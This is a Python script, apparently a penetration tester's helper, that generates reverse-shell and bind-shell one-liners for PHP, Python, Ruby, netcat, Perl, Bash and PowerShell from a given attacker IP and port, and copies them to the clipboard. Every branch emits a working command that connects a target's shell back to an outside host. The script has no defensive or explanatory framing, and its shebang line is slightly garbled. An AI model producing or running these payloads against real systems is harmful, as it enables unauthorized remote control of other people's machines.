#!/bin/#!/usr/bin/env python3

# This is a script that will help me generate my reverse shells less typing and copy/pasting than I normally
# have to deal with.

# libraries
import argparse
import pyperclip




# Arg Parser
parser = argparse.ArgumentParser(description="Easy copy-pasta my shells.")
parser.add_argument("-i", "--localIP", action="store", dest="attackerIP", help="Your box's IP.", required=True)
parser.add_argument("-p", "--port", action="store", dest="port", help="Port to connect to.", required=True)
parser.add_argument("-l", "--language", action="store", dest="language", help="Language to create shell.", required=True, type=str)
parser.add_argument("-s", "--shelltype", action="store", dest="shellType", help="Reverse or Bind shell.", required=False, type=str)
args = parser.parse_args()


# Set attacker and victim IPs
attackerIP = args.attackerIP
port = args.port
language = (args.language).lower()


# set ports local for reverse shell, target for bind shell


# What language?


def ezShell():
    if language == "php":
        print(f"[+] PHP Reverse shell:\n php -r '$sock=fsockopen(\"{attackerIP}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");' ")
        pyperclip.copy(f"php -r '$sock=fsockopen(\"{attackerIP}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
        print()
    elif language == "python":
        print(f"[+] Python Reverse shell:\n python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attackerIP}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
        pyperclip.copy(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attackerIP}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
    elif language == "ruby":
        print(f"[+] Ruby Reverse shell:\n ruby -rsocket -e'f=TCPSocket.open(\"{attackerIP}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
        pyperclip.copy(f"ruby -rsocket -e'f=TCPSocket.open(\"{attackerIP}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
    elif language == "nce":
        print(f"[+] Netcat with the -e option:\n nc -e /bin/sh {attackerIP} {port}")
        pyperclip.copy(f"nc -e /bin/sh {attackerIP} {port}")
    elif language == "nc":
        print(f"[+] Netcat without the -e option:\n mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc {attackerIP} {port} 1>/tmp/backpipe")
        pyperclip.copy(f"mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc {attackerIP} {port} 1>/tmp/backpipe")
    elif language == "ncb":
        print(f"[+] Netcat bind shell:\n nc -vlp 5555 -e /bin/bash")
        pyperclip.copy(f"nc -vlp 5555 -e /bin/bash")
    elif language == "perl":
        print("[+] Perl reverse shell:\n perl -e 'use Socket;$i=" + '"' + attackerIP + '"'+ ";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")
        pyperclip.copy(f"perl -e 'use Socket;$i=" + '"' + attackerIP + '"'+ ";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")
    elif language == "bash":
        print(f"[+] Bash reverse shell:\n bash -i >& /dev/tcp/{attackerIP}/{port} 0>&1")
        pyperclip.copy(f"bash -i >& /dev/tcp/{attackerIP}/{port} 0>&1")
    elif language == "ps":
        print("[+] Powershell reverse shell:\n $client = New-Object System.Net.Sockets.TCPClient(" + attackerIP + "," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
        pyperclip.copy("$client = New-Object System.Net.Sockets.TCPClient(" + attackerIP + "," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
    else:
        print("Try another language, or check for typos.")

ezShell()
